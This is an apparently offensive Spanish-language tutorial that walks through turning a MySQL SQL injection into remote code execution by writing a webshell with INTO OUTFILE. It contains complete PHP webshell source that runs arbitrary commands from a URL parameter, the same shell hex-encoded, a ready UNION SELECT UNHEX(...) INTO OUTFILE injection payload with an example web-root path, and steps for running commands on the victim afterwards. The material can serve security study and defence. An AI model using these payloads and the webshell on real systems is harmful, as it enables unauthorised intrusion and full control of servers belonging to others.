# **SQLi a RCE: Guía Definitiva de Webshell con `INTO OUTFILE`**

Esta guía detalla el proceso completo para escalar una vulnerabilidad de **Inyección SQL** a una **Ejecución Remota de Código (RCE)** mediante la escritura de una webshell. Se aborda el escenario complejo y realista donde la inyección está limitada a **una sola columna**, lo que requiere técnicas de codificación para el payload.

-----

## **El Concepto: De una Consulta a una Shell**

La cláusula `SELECT ... INTO OUTFILE 'nombre_archivo'` de **MySQL/MariaDB** permite exportar el resultado de una consulta a un archivo en el servidor. Si podemos controlar la consulta (SQLi) y el destino del archivo (conociendo el web root), podemos escribir una webshell y obtener control total.

-----

## **🚨 Checklist de Requisitos Indispensables**

Este ataque es potente pero altamente situacional. Antes de intentarlo, debes verificar que se cumplen **TODAS** las siguientes condiciones. Si una sola falla, el ataque no funcionará.

  * ### **1. Privilegio `FILE` en el Usuario de la BBDD**

    El usuario que utiliza la aplicación web para conectarse a la base de datos debe tener el permiso global `FILE`. Este es un privilegio muy poderoso y poco común en entornos bien configurados.

    ✅ **Check:** ¿El usuario de la BBDD tiene privilegios para escribir archivos en el servidor?

  * ### **2. Configuración Permisiva de `secure_file_priv`**

    Esta variable de sistema de MySQL/MariaDB es la defensa más común contra este ataque. Su valor determina dónde se pueden escribir archivos:

      * `secure_file_priv = NULL`: **Ataque Imposible.** La escritura de archivos está deshabilitada.
      * `secure_file_priv = '/una/ruta/especifica/'`: **Ataque Situacional.** Solo se puede escribir en ese directorio exacto. El ataque solo funciona si esa ruta es accesible desde la web.
      * `secure_file_priv = ''` (Cadena Vacía): **Ataque Posible.** No hay restricciones de directorio. Es el escenario ideal para un atacante.

    ✅ **Check:** ¿La configuración de la BBDD permite la escritura en directorios arbitrarios o en el directorio web?

  * ### **3. Conocimiento de la Ruta Absoluta del Directorio Web**

    `INTO OUTFILE` no funciona con rutas relativas. Necesitas la ruta completa del sistema de ficheros donde se alojan los archivos web.

      * **¿Cómo encontrarla?** A través de otras vulnerabilidades (LFI), mensajes de error de la aplicación, o adivinando rutas por defecto (`/var/www/html`, `C:\inetpub\wwwroot`, etc.).

    ✅ **Check:** ¿Conoces la ruta absoluta del web root?

-----

## **El Proceso de Explotación (Paso a Paso)**

### **Paso 1: Preparar la Webshell Profesional**

Usaremos una interfaz cómoda para ejecutar comandos.

```php
<html>
<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd'] . ' 2>&1');
        }
    ?>
    </pre>
</body>
</html>
```

### **Paso 2: La Magia de la Codificación Hexadecimal**

El principal obstáculo, especialmente en una inyección de una sola columna, son los caracteres especiales (comillas, ángulos, etc.) que romperían la sintaxis SQL. La solución es codificar toda la webshell en hexadecimal.

```bash
# Comando para convertir el código de la webshell a una cadena hexadecimal sin saltos de línea
echo '<html>...</html>' | xxd -p | tr -d '\n'
```

**Payload Hexadecimal Resultante:**

```
3c68746d6c3e3c626f64793e3c666f726d206d6574686f643d2247455422206e616d653d223c3f706870206563686f20626173656e616d6528245f5345525645525b275048505f53454c46275d293b203f3e223e3c696e70757420747970653d225445585422206e616d653d22636d6422206175746f666f6375732069643d22636d64222073697a653d223830223e3c696e70757420747970653d225355424d4954222076616c75653d2245786563757465223e3c2f666f726d3e3c7072653e3c3f70687020696628697373657428245f4745545b27636d64275d29297b73797374656d28245f4745545b27636d64275d202e202720323e263127293b7d3f3e3c2f7072653e3c2f626f64793e3c2f68746d6c3e
```

### **Paso 3: Construir el Payload SQL Final**

Con el payload codificado, lo inyectamos usando una función de MySQL para que lo decodifique antes de escribirlo en el archivo.

> 📌 **Nota:** Asumimos que ya has usado `ORDER BY` para confirmar que la consulta tiene **1 columna**.

#### **Payload SQL Definitivo (Plantilla)**

```sql
' UNION SELECT UNHEX('PAYLOAD_HEXADECIMAL_AQUI') INTO OUTFILE '/ruta/absoluta/al/webroot/nombre_shell.php'--
```

#### **Ejemplo Real**

```sql
' UNION SELECT UNHEX('3c68746d6c...[resto_del_hex]...2f68746d6c3e') INTO OUTFILE '/var/www/html/shell.php'--
```

  * **`UNHEX('...')`**: Es la función clave. Convierte la cadena hexadecimal de vuelta a código PHP legible. Una alternativa es usar el prefijo `0x...`, que MySQL también interpreta como hexadecimal.
  * **`INTO OUTFILE '...'`**: Escribe el resultado (el código PHP ya decodificado) en el archivo de destino.

-----

## **Post-Explotación: Interactuando con la Webshell**

Si todos los requisitos se cumplieron y la consulta se ejecutó, tu webshell profesional estará activa.

1.  **Accede a la URL en tu navegador:**
    `http://<IP_VICTIMA>/shell.php`

2.  **Ejecuta comandos desde la interfaz:**
    Verás un campo de texto. Escribe un comando (ej: `id; pwd; ls -la`) y haz clic en "Execute".

3.  **Resultado:**
    La salida del comando aparecerá formateada debajo del formulario, permitiéndote interactuar con el sistema de forma cómoda y eficiente.
